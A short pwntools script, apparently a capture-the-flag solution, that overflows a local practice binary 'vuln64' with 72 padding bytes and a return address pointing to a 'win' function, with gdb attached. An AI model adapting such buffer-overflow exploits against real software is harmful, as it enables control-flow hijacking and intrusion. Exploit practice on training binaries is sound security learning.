from pwn import *

io = process('./vuln64')
gdb.attach(io, api=True)

payload = b'a'*72 + p64(0x000000000040115b) # p32(exe.sym['win'])
io.sendline(payload)
io.interactive()